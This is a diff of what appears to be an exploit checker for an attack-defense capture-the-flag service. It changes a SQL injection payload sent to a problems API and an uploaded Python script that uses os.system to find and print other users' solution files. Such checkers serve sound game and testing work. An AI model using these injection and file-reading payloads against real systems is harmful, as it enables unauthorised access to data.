@@ -295,7 +295,7 @@ async def exploit_drafts(task: ExploitCheckerTaskMessage, searcher: FlagSearcher
 
     response = await conn.client.post(
         "/api/problems",
-        data={"author_id": "1 OR 1=1"}
+        data={"author_username": "anything' OR '1'='1' -- "}
     )
     
     if response.status_code not in [200, 201, 302]:
@@ -340,7 +340,7 @@ async def exploit_solutions(task: ExploitCheckerTaskMessage,
         raise MumbleException("No problems available for exploit")
     
     exploit_script = """import os
-os.system('find submissions -type f -name "solution.py" | while read -r file; do echo "===== $file ====="; cat "$file"; echo; done')
+os.system('find ../var/www/html/public/submissions -type f -name "solution.py" | while read -r file; do echo "===== $file ====="; cat "$file"; echo; done')
 """
 
     response = await conn.client.post(
